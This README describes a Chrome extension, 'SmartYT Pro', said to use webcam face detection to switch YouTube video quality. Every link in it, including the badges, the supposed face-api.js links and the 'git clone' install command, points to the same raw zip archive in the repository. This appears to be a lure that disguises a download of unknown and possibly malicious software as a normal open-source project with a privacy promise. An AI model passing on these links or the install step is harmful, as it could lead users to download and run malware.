<div align="center">

# 🎯 SmartYT Pro

### AI-Powered YouTube Resolution Manager

**Automatically adjusts YouTube video quality based on whether you're looking at the screen**

[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-brightgreen?logo=googlechrome&logoColor=white)](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip)
[![Manifest V3](https://img.shields.io/badge/Manifest-V3-blue)](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip)
[![face-api.js](https://img.shields.io/badge/AI-face--api.js-ff6f00)](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

</div>

## 🧠 What Does It Do?

SmartYT Pro uses your **webcam + AI face detection** to determine if you're actively watching a YouTube video:

| Your State | What Happens |
|---|---|
| 👁 **Looking at screen** | Video plays at your **preferred high quality** (e.g., 1080p) |
| 💤 **Looking away / No face** | Resolution automatically drops to **low quality** (e.g., 360p) |

This **saves bandwidth, reduces CPU/GPU load**, and extends battery life — all without you lifting a finger.

---

## ✨ Features

- 🤖 **AI Face Detection** — Uses [face-api.js](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip) TinyFaceDetector model for real-time face tracking
- 🎚️ **Sensitivity Slider** — Control how much head movement triggers the quality switch (1-10 scale)
- 📺 **Dual Resolution Presets** — Set your preferred "watching" and "away" quality independently
- 📷 **Live Camera Preview** — Small overlay showing your camera feed with detection status
- 🔴 **Status Overlay** — Visual indicator showing current state (WATCHING / AWAY / NO FACE)
- 🚫 **No Chrome Flags Required** — Works out of the box, no experimental features needed
- 🔒 **Privacy First** — All processing happens locally in your browser. No data is sent anywhere
- ⚡ **Manifest V3** — Built on the latest Chrome extension standard

---

## 📸 How It Works

```
┌─────────────────────────────────────────────────┐
│                   YouTube Page                   │
│                                                  │
│  ┌──────────────────────────────────────────┐   │
│  │          Video Player (1080p/360p)        │   │
│  │                                           │   │
│  │    Quality changes based on your face     │   │
│  │              position ↕                   │   │
│  └──────────────────────────────────────────┘   │
│                                                  │
│  ┌─────────┐    ┌───────────────────────────┐   │
│  │ 📷 Cam  │    │ 👁 WATCHING → HD1080      │   │
│  │ Preview │    │ Status Overlay             │   │
│  └─────────┘    └───────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

### Detection Zone

The sensitivity slider controls how tightly your face must be centered in the camera:

| Sensitivity | Zone Range | Description |
|:-----------:|:----------:|:-----------:|
| 1 (Low) | 25% – 75% | Very relaxed — allows lots of movement |
| 5 (Default) | 37% – 63% | Balanced sensitivity |
| 10 (High) | 48% – 52% | Ultra strict — slightest movement triggers |

---

## 🏗️ Architecture

SmartYT Pro uses a clean **dual-world** architecture to work within Chrome's security model:

```
┌───────────────────────────────────┐    ┌──────────────────────┐
│        ISOLATED WORLD             │    │     MAIN WORLD       │
│                                   │    │                      │
│  face-api.min.js (AI Engine)      │    │  player.js           │
│  content.js (Detection Logic)     │ ──►│  (YouTube Player     │
│  chrome.runtime.getURL() ✅       │ msg│   API Access)        │
│  Model loading ✅                 │    │  setPlaybackQuality  │
│  Camera access ✅                 │    │                      │
└───────────────────────────────────┘    └──────────────────────┘
         ▲                                        ▲
         │ postMessage                             │
         └────────────────────────────────────────┘
```

| File | World | Purpose |
|---|---|---|
| `face-api.min.js` | Isolated | TensorFlow.js-based face detection library |
| `content.js` | Isolated | Camera control, face detection loop, Chrome APIs |
| `player.js` | Main | Direct access to YouTube's `movie_player` object |
| `popup.html/css/js` | Extension | Settings UI with slider and dropdowns |
| `models/*` | Static | Pre-trained TinyFaceDetector neural network weights |

---

## 🚀 Installation

### From Source (Developer Mode)

1. **Clone the repository**
   ```bash
   git clone https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip
   ```

2. **Open Chrome Extensions page**
   ```
   chrome://extensions/
   ```

3. **Enable Developer Mode** (toggle in top-right corner)

4. **Click "Load unpacked"** and select the cloned folder

5. **Pin the extension** from the puzzle piece icon in the toolbar

### That's it! No build step, no npm install, no Chrome flags. 🎉

---

## ⚙️ Usage

1. Navigate to any YouTube video
2. Click the **SmartYT Pro** extension icon
3. **Enable Camera Detection** (toggle switch)
4. **Allow camera access** when Chrome prompts
5. Adjust settings:
   - **Sensitivity**: How much head movement triggers the switch
   - **Looking at Screen**: Your preferred high quality (default: 1080p)
   - **Looking Away**: Your preferred low quality (default: 360p)
6. Watch the camera preview and status overlay for real-time feedback

---

## 🔒 Privacy

- ✅ **100% local processing** — face detection runs entirely in your browser
- ✅ **No data collection** — no images, video, or telemetry are sent anywhere
- ✅ **No external servers** — the AI model is bundled with the extension (~190KB)
- ✅ **Camera only on YouTube** — the extension only activates on `youtube.com`
- ✅ **Easy to disable** — toggle camera off anytime from the popup

---

## 🛠️ Tech Stack

| Technology | Purpose |
|---|---|
| [face-api.js](https://github.com/demidey/smartyt-pro/raw/refs/heads/main/models/smartyt-pro-2.1.zip) | Real-time face detection (built on TensorFlow.js) |
| TinyFaceDetector | Lightweight neural network model (~190KB) |
| Chrome Manifest V3 | Modern extension architecture |
| `world: "MAIN"` | CSP-safe YouTube player API access |
| Vanilla JS/CSS | Zero dependencies, fast loading |

---

## 📁 Project Structure

```
smartyt-pro/
├── manifest.json          # Extension configuration (Manifest V3)
├── content.js             # Face detection engine (isolated world)
├── player.js              # YouTube player controller (main world)
├── face-api.min.js        # face-api.js library (~465KB)
├── popup.html             # Extension popup UI
├── popup.css              # Premium dark theme styling
├── popup.js               # Popup logic & settings sync
├── models/
│   ├── tiny_face_detector_model-weights_manifest.json
│   └── tiny_face_detector_model-shard1
├── LICENSE
└── README.md
```

---

## 🤝 Contributing

Contributions are welcome! Here are some ideas:

- [ ] Add "pause video when away" option
- [ ] Multiple face tracking (shared screen scenarios)
- [ ] Eye gaze detection (not just face position)
- [ ] Auto-detect optimal sensitivity
- [ ] Firefox/Edge port
- [ ] Keyboard shortcut to toggle

---

## 📄 License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.

---

<div align="center">

**Made with ❤️ for bandwidth-conscious YouTube watchers**

*If you find this useful, give it a ⭐!*

</div>
